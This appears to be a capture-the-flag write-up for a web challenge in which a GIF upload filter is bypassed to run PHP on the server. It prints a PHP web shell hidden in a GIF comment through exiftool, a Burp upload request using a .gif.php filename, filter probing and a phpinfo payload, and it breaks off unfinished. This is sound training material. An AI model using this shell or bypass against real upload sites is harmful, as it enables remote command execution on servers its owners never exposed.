# Unsanitary

## Web: 500 Points

## Challenge

My friend thinks his GIF file sharing website is secure. It's still under construction and needs a lot of work, but he wants to know if it's vulnerable. Can you hack into his website?

[ [Start](http://challenges.laptophackingcoffee.org:6464/) ]

Note: The server resets to default every 30 minutes. All progress will be lost

## Solution

https://www.youtube.com/watch?v=nNB9XlRfvzw
https://superuser.com/questions/556315/gif-image-exif-tags
```
exiftool -comment="This is a comment!" Sample.gif
```

```
$ exiftool -comment="<h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" cat-shell.gif 

1 image files updated
```

http://challenges.laptophackingcoffee.org:6464/images/cat-shell.gif.php
```
Warning: Unexpected character in input: '' (ASCII=3) state=0 in /var/www/app/images/cat-shell.gif.php on line 143

Parse error: syntax error, unexpected '=' in /var/www/app/images/cat-shell.gif.php on line 143
```

exiftool:
```
$ exiftool untitled.gif.php 
ExifTool Version Number         : 11.88
File Name                       : untitled.gif.php
Directory                       : .
File Size                       : 189 bytes
File Modification Date/Time     : 2020:07:14 22:44:01-06:00
File Access Date/Time           : 2020:07:14 22:47:34-06:00
File Inode Change Date/Time     : 2020:07:14 22:47:16-06:00
File Permissions                : rw-rw-r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 1
Image Height                    : 1
Has Color Map                   : Yes
Color Resolution Depth          : 1
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : <h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>
Image Size                      : 1x1
Megapixels                      : 0.000001
```

burpsuite
```
POST / HTTP/1.1
Host: challenges.laptophackingcoffee.org:6464
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenges.laptophackingcoffee.org:6464/
Content-Type: multipart/form-data; boundary=---------------------------36969556719905097901151866452
Content-Length: 424
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------36969556719905097901151866452
Content-Disposition: form-data; name="upfile"; filename="untitled.gif.php"
Content-Type: application/x-php

GIF89a
```

https://github.com/tennc/webshell/blob/master/php/gif.php
https://github.com/tennc/webshell/blob/master/php/gif.php

```
$ exiftool -comment="<h1>hello world<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" cat-shell.gif 

1 image files updated
```

isolate what the website is checking

test.gif (empty file)
```
Image type not supported, GIF files only!
```

file with GIF87a, with no other content. test.txt:
```
Image type not supported, GIF files only!
```

file with GIF87a, with no other content. test.gif:
```
Image type not supported, GIF files only!
```

2x2 gif made with GIMP:
```
Path: images/test.gif, image upload successful!
```

Visit url and it displays the image: 

http://challenges.laptophackingcoffee.org:6464/images/test.gif


2x2 gif with .php extension
```
Path: images/test.gif.php, image upload successful!
```

http://challenges.laptophackingcoffee.org:6464/images/test.gif.php
```
GIF87a����,;
```


```
$ cat test.gif.php
GIF89a����,
           ;<?phpinfo();?>
```